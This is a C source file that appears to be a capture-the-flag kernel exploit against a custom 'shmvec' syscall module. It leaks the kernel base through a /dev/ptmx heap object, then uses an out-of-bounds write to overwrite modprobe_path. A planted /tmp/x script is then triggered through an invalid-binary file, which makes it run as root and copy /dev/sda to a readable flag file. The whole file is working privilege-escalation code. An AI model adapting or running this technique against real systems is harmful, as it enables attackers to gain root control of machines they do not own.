#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void shmvec_init(unsigned long count){
    asm(
        "mov rax, 600\n"
        "syscall\n"
    );
}

void shmvec_set(unsigned long index, unsigned long data){
    asm(
        "mov rax, 602\n"
        "syscall\n"
    );
}

void shmvec_get(unsigned long index, unsigned long *desc){
    asm(
        "mov rax, 603\n"
        "syscall\n"
    );   
}

int main(){
    unsigned long *desc;
    unsigned long modprobe = 0x1850da0;
    unsigned long kbase = 0;

    shmvec_init(0x400/8);
    int fd = open("/dev/ptmx", O_RDONLY);
    close(fd);
    shmvec_init(0x400/8);
    shmvec_get(0x18/8, desc);
    kbase = *desc - 0x1278960;
    printf("kbase: %lx\n", kbase);

    shmvec_init(0x2000000000000000);
    shmvec_set((kbase+modprobe-0x10)/8, 132145145017391);

    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("/tmp/dummy");
    system("cat /tmp/flag");

    return 0;
}
